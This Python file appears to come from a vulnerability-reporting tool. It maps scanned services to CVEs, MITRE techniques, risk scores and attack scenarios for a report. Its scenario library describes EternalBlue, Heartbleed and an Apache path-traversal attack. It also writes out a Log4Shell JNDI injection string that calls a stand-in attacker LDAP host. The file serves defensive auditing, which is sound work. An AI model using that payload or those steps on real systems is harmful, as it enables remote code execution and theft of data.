import json
from typing import List, Dict, Any
from services.vuln_service import VulnService
from services.risk_ml_model import RiskMLModel
from services.cvss_calculator import CVSSCalculator

from services.threat_intel_engine import ThreatIntelEngine
from services.ai_risk_engine import ai_risk_engine

class IntelOrchestrator:
    """
    SENIOR THREAT INTELLIGENCE ORCHESTRATOR
    Synthesizes multi-source intelligence into professional attack path audits.
    """

    SCENARIO_LIBRARY = {
        "CVE-2017-0144": {
            "name": "EternalBlue SMB Remote Code Execution",
            "scenario": "1. Attacker identifies open TCP port 445 on target. 2. A specially crafted SMBv1 packet is sent to trigger a buffer overflow in the srv.sys kernel driver. 3. Attacker achieves kernel-level code execution and deploys DoublePulsar backdoor. 4. Complete system compromise with SYSTEM privileges.",
            "mitre": "T1210 - Exploitation of Remote Services (Initial Access)",
            "difficulty": "Easy (Automated tools available)"
        },
        "CVE-2021-44228": {
            "name": "Log4Shell JNDI Injection",
            "scenario": "1. Attacker identifies a field logged by Log4j. 2. Injects ${jndi:ldap://attacker.com/a} via HTTP headers or inputs. 3. Target server performs JNDI lookup to attacker-controlled LDAP server. 4. Server downloads and executes malicious Java class. 5. Results in full Remote Code Execution (RCE).",
            "mitre": "T1190 - Exploit Public-Facing Application (Initial Access)",
            "difficulty": "Medium (Requires Java environment alignment)"
        },
        "CVE-2014-0160": {
            "name": "Heartbleed OpenSSL Memory Leak",
            "scenario": "1. Attacker sends a malformed TLS Heartbeat request to the target server. 2. The server fails to bound-check the request, returning up to 64KB of process memory. 3. Attacker repeats the process to harvest session cookies, private keys, and user credentials from RAM.",
            "mitre": "T1005 - Data from Local System (Collection)",
            "difficulty": "Easy"
        },
        "CVE-2021-41773": {
            "name": "Apache Path Traversal & RCE",
            "scenario": "1. Attacker sends a crafted GET request using URL-encoded '../' sequences (%2e%2e/). 2. Bypass of document root security allows reading sensitive system files like /etc/passwd. 3. If mod_cgi is enabled, attacker can execute shell commands via command injection.",
            "mitre": "T1006 - Direct Volume Access (Collection / Initial Access)",
            "difficulty": "Easy"
        }
    }

    def __init__(self):
        self.risk_engine = RiskMLModel()
        # Ensure model is trained for AI reasoning
        try: self.risk_engine.train()
        except: pass

    def generate_professional_report(self, host_ip: str, scan_results: List[Dict]) -> Dict:
        """
        Orchestrates full-spectrum vulnerability intelligence into a professional JSON audit.
        """
        vulnerabilities = []

        for s_info in scan_results:
            port = s_info.get("port")
            service = s_info.get("service", "Unknown")
            product = s_info.get("product", "")
            version = s_info.get("version", "")
            term = f"{product} {version}".strip()
            
            raw_findings = VulnService.analyze_vulnerabilities([s_info])
            findings_list = raw_findings.get("vulnerabilities", [])
            
            for f in findings_list:
                cve_id = f.get("cve_id", "N/A")
                cvss_score = float(f.get("cvss", 5.0))
                desc = f.get("description", "")
                exploit_available = f.get("exploit_available", False)

                # 1. MITRE ATT&CK Mapping (Task 2)
                mitre_intel = ThreatIntelEngine.get_mitre_mapping(cve_id, desc)

                # 2. Custom Risk Scoring (Task 4 & 5)
                risk_intel = ThreatIntelEngine.calculate_custom_risk(
                    cvss_score, exploit_available, service, mitre_intel.get("tactic", "")
                )

                # 3. Attack Scenario Generation (Task 3)
                scenario = ThreatIntelEngine.generate_scenario(
                    cve_id, service, mitre_intel.get("technique_name", "")
                )

                # 4. AI Confidence (Task 6)
                # Use AIRiskEngine features to predict success likelihood
                ai_results = ai_risk_engine.predict_risk([f])
                confidence_val = ai_results[0].get("confidence", 0.75) if ai_results else 0.75

                # 5. Schema Alignment (Task 7)
                vulnerabilities.append({
                    "cve_id": cve_id,
                    "mitre": mitre_intel,
                    "attack_scenario": scenario,
                    "cvss": str(cvss_score),
                    "custom_risk_score": str(risk_intel["score"]),
                    "risk_level": risk_intel["level"],
                    "exploit_available": exploit_available,
                    "confidence": f"{int(confidence_val * 100)}%"
                })

        # 5. Global AI Prioritization (Task 5)
        top_risk = ai_risk_engine.get_top_vulnerability(vulnerabilities)

        return {
            "target": host_ip,
            "top_vulnerability": {
                "cve_id": top_risk.get("cve_id", "N/A"),
                "risk_score": str(top_risk.get("risk_score", 0.0)),
                "priority": 1,
                "reason": top_risk.get("reason", "Highest aggregated risk factor.")
            },
            "vulnerabilities": vulnerabilities,
            "summary": {
                "total": len(vulnerabilities),
                "critical_risks": len([v for v in vulnerabilities if v["risk_level"] == "Critical"]),
                "audit_grade": "Advanced Threat Intelligence"
            }
        }

if __name__ == "__main__":
    # Senior Analyst Demonstration
    orchestrator = IntelOrchestrator()
    
    # Simulated Scan Results for a High-Risk Server
    sample_scan = [
        {
            "port": 445,
            "service": "SMB",
            "product": "Microsoft Windows SMB",
            "version": "1.0"
        },
        {
            "port": 80,
            "service": "HTTP",
            "product": "Apache httpd",
            "version": "2.4.49"
        }
    ]
    
    print("[ANALYST] Orchestrating High-Fidelity Intelligence Report...")
    formal_report = orchestrator.generate_professional_report("192.168.1.10", sample_scan)
    
    # Output formatted as requested
    print(json.dumps(formal_report, indent=2))
